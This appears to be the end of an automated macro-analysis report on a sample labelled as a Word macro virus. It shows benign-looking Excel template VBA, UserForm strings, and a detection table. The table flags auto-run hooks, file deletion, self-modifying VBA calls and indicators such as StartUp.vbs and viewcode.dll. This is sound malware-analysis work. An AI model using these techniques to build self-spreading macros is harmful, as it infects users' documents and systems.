  Exit Sub

Err_2B:

  If Err <> 1004 And Err <> 1006 Then

    Msg = Univ_Error & Str(Err) & ": " & Error(Err)
    MsgBox Msg, vbCritical, SheetBar
    Err = 0
  Else
    Err_Flg = True
    Err = 0
    Resume Next
  End If

  On Error GoTo 0
  'Application.ScreenUpdating = True

End Sub



' **********************************************
' * Procedures which manage content data entry *
' **********************************************


Sub ArrangeEntries()
Attribute ArrangeEntries.VB_ProcData.VB_Invoke_Func = " \n14"
'Makes sure entered data lines up in correct positions

    If Not ActiveCell.HasFormula Then
        
        On Error GoTo Err_3
            
        Set MarkCell_1 = ActiveCell
        Set MarkCell_2 = ActiveCell
    
        Do Until LCase(Left(MarkCell_2.Name.Name, 4)) = "data"
            Set MarkCell_2 = MarkCell_2.Offset(0, -1)
        Loop
                
        If MarkCell_1 <> MarkCell_2 Then
            MarkCell_2.Value = MarkCell_1.Value
            MarkCell_1.ClearContents
            MarkCell_2.Select
        End If
    End If
    On Error GoTo 0
    Exit Sub

Err_3:
    
    Select Case Err
    
    Case 1006
        Err = 0
        Resume Next
        
    Case 1004
        Err = 0
        MarkCell_1.Select
    
    Case Else
        
        Msg = Univ_Error & Str(Err) & ": " & Error(Err)
        MsgBox Msg, vbCritical, SheetBar
        Err = 0
    
    End Select

End Sub



' ************************************
' * Calls to customized dialog boxes *
' ************************************


Sub VillageCredit()
Attribute VillageCredit.VB_ProcData.VB_Invoke_Func = " \n14"
'Village Software credits box

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg
    .Buttons.Visible = True
    .Show
  End With

End Sub

Sub Village_But1()
Attribute Village_But1.VB_ProcData.VB_Invoke_Func = " \n14"

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg2
    .Buttons("CRED_SUP").Visible = False
    .Buttons("CRED_LIC").Visible = False
  End With
  
End Sub

Sub Village_But2()
Attribute Village_But2.VB_ProcData.VB_Invoke_Func = " \n14"

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg3
    .Buttons("CRED_SUP").Visible = False
    .Buttons("CRED_LIC").Visible = False
  End With
  
    
End Sub



Sub ChangeFont()
Attribute ChangeFont.VB_ProcData.VB_Invoke_Func = " \n14"
'Changes the font in the preview panels

  Dim Return_1 As Object

  If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then
    
    ShtMem = ActiveSheet.Index
    
    Sheets(Vital).Activate
    Set Return_1 = ActiveCell
    
    Sheets(Vital).Range("LTR").Select
    
    If Application.Dialogs(xlDialogActiveCellFont).Show Then
        With Selection.Font
            LetterFont = .Name
            LetterColor = .ColorIndex
            LetterSize = .Size
            LetterStyle = .FontStyle
            .Underline = xlNone
            PreviewPane
        End With
    End If
    
    Return_1.Select
    Sheets(ShtMem).Activate
  Else
  
    MsgBox LetterFont_Error, vbCritical, SheetBar
  End If

End Sub


Sub DocumentCell()
Attribute DocumentCell.VB_ProcData.VB_Invoke_Func = " \n14"
'Places a Cell Tip in the worksheet

    On Error GoTo Err_S:
    Selection.DataSeries
    
    If TypeName(Selection) = cRange Then
        Application.Dialogs(xlDialogNote).Show
    End If

Err_S:
End Sub



' ***************************************
' * Supporting procedures and functions *
' ***************************************


Function CheckScenarios(ScenarioName, Scenariopage)
Attribute CheckScenarios.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if a scenario is in a worksheet, returns T/F
    
    CheckScenarios = False
    If Scenariopage > 0 Then
        For Each ThisScenario In Sheets(Scenariopage).Scenarios
            If ThisScenario.Name = ScenarioName Then
                CheckScenarios = True
            End If
        Next
     End If
     
End Function


Function ParentWorkbook(WorkbookName)
Attribute ParentWorkbook.VB_ProcData.VB_Invoke_Func = " \n14"
'Returns the template parent name of the input workbookname

    If UCase(Right(WorkbookName, 4)) = ".XLS" _
     Or UCase(Right(WorkbookName, 4)) = ".XLT" Then
        WorkbookName = Left(WorkbookName, Len(WorkbookName) - 4)
    End If
    
    If IsNumeric(Right(WorkbookName, 1)) Then
        ParentWorkbook = ParentWorkbook(Left(WorkbookName, Len(WorkbookName) - 1))
    Else
        ParentWorkbook = WorkbookName
    End If
    
End Function


Function SiblingWorkbooks(WorkbookName, NumberHurdle)
Attribute SiblingWorkbooks.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if any other "offspring" workbooks are present, returns name or null
'NumberHurdle is how many siblings need be concurrently open to return non-False

    i = 0
    SiblingWorkbooks = Null
    For Each ThisBook In Workbooks
        If UCase(WorkbookName) = Left(UCase(ThisBook.Name), Len(WorkbookName)) Then
            i = i + 1
            If TypeName(ActiveSheet) <> cNothing Then
                If ThisBook.Name <> ActiveWorkbook.Name Then
                    tEmp = ThisBook.Name
                End If
            End If
        End If
    Next
    
    If i > NumberHurdle Then
        SiblingWorkbooks = tEmp
    Else
        SiblingWorkbooks = Null
    End If
    
End Function


Function CheckBooks(BookName)
Attribute CheckBooks.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if a workbook is open, returns T/F

    NumberofWorkbooks = Application.Workbooks.Count
    CheckBooks = False
    For Each ThisBook In Workbooks
        If LCase(ThisBook.Name) = LCase(BookName) Then
            CheckBooks = True
        End If
    Next
       
End Function


Function CheckSheets(SheetName, ThisBookName)
Attribute CheckSheets.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if a sheet is in a workbook, returns T/F

    NumberofSheets = Workbooks(ThisBookName).Sheets.Count
    CheckSheets = False
    On Error Resume Next
    Set ThisSheet = Workbooks(ThisBookName).Sheets(SheetName)
    If TypeName(ThisSheet) <> cEmpty Then
        CheckSheets = True
    End If
       
End Function


Function NameIndex(RName)
Attribute NameIndex.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks to see if a name is in a sheet, returns index

    Dim Count As Integer
    Dim Loop1 As Integer
    
    Count = ActiveWorkbook.Names.Count
    NameIndex = False
    For Loop1 = 1 To Count
        If ActiveWorkbook.Names(Index:=Loop1).Name = RName Then
            NameIndex = Loop1
        End If
    Next
    
End Function


Function CheckBars(BarName)
Attribute CheckBars.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if a toolbar is in a worksheet, returns T/F

    CheckBars = False
    On Error Resume Next
    Set ThisToolbar = Toolbars(BarName)
    If TypeName(ThisToolbar) <> cEmpty Then
        CheckBars = True
    End If
       
End Function


Function CheckAddIns(AddInName, AddInTitle)
Attribute CheckAddIns.VB_ProcData.VB_Invoke_Func = " \n14"
'Checks if an addin is available to Excel, returns T/F

    CheckAddIns = False
    On Error GoTo NotLoadedTrap
    AddInTitle = Workbooks(AddInName).Title
    CheckAddIns = True
    Exit Function
    
NotLoaded:
    On Error GoTo CantLoadTrap
    Workbooks.Open Application.LibraryPath & Application.PathSeparator & AddInName
    AddInTitle = Workbooks(AddInName).Title
    CheckAddIns = True
    Exit Function
    
NotLoadedTrap:
    Resume NotLoaded
    
CantLoadTrap:
    CheckAddIns = False
    
End Function
    

Sub Unhide_Workbook(WBook)
Attribute Unhide_Workbook.VB_ProcData.VB_Invoke_Func = " \n14"
'Unhides a hidden workbook, called on closedown

    For Each ThisWindow In Windows
        WWind = Trim(ThisWindow.Caption)
        If Not IsError(Application.Search(":", WWind)) Then
            WWind = Left(WWind, Application.Find(":", WWind) - 1)
        End If
        If WWind = WBook Then
            If ThisWindow.Visible = False Then _
             ThisWindow.Visible = True
        End If
    Next

End Sub


Function ZoomFactor()
Attribute ZoomFactor.VB_ProcData.VB_Invoke_Func = " \n14"
'Returns the proper default zoom factor for the user's display
 
    Select Case ActiveWindow.Width
        Case 1 To 600
            ZoomFactor = Zoom1
        Case 601 To 1050
            ZoomFactor = Zoom2
        Case Else
            ZoomFactor = Zoom3
    End Select
    
End Function


Function FlName(PathName)
Attribute FlName.VB_ProcData.VB_Invoke_Func = " \n14"
'Returns the file name from a full path name

    If InStr(PathName, Application.PathSeparator) > 0 Then
        FlName = FlName(Right(PathName, Len(PathName) - InStr(PathName, Application.PathSeparator)))
    Else
        FlName = PathName
    End If

End Function


Sub Nada()
Attribute Nada.VB_ProcData.VB_Invoke_Func = " \n14"
'This area intentionally left blank
End Sub
 
 
Sub NotAvail()
Attribute NotAvail.VB_ProcData.VB_Invoke_Func = " \n14"
 
        MsgBox NotAvail_String, vbOKOnly + vbInformation, SheetBar
 
End Sub


Sub Help()
Attribute Help.VB_ProcData.VB_Invoke_Func = " \n14"
'Call to help file

  Application.Help Application.Path & Application.PathSeparator & File_Help & ".hlp", 6

End Sub



' ***************************************************
' * Procedures specific to this particular template *
' ***************************************************



Sub Specific_CheckSheet()
Attribute Specific_CheckSheet.VB_ProcData.VB_Invoke_Func = " \n14"
'Template specific routines to be run in CheckSheet

End Sub


Sub Specific_AutoStart()
Attribute Specific_AutoStart.VB_ProcData.VB_Invoke_Func = " \n14"

End Sub


Sub Specific_AutoStop()
Attribute Specific_AutoStop.VB_ProcData.VB_Invoke_Func = " \n14"

End Sub


Sub BUD_ChangeGraph()
Attribute BUD_ChangeGraph.VB_ProcData.VB_Invoke_Func = " \n14"
'change the graph type
    
    On Error GoTo Err_A
    ActiveSheet.ChartObjects("BUDGRPH").Activate
    Application.Dialogs(xlDialogGallery3dPie).Show
    ActiveSheet.Activate
    Exit Sub
    
Err_A:
    
    MsgBox Graph_Error, vbOKOnly + vbCritical, SheetBar
    Err = 0
    On Error GoTo 0

End Sub











-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hello
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1BM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox2BM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Female@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Malea
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962' - OLE stream: '_VBA_PROJECT_CUR/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|AutoExec  |Label3_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.villageso|URL                                          |
|          |ft.com              |                                             |
|IOC       |StartUp.vbs         |Executable file name                         |
|IOC       |viewcode.dll        |Executable file name                         |
|Base64    |T9`                 |VDlg                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

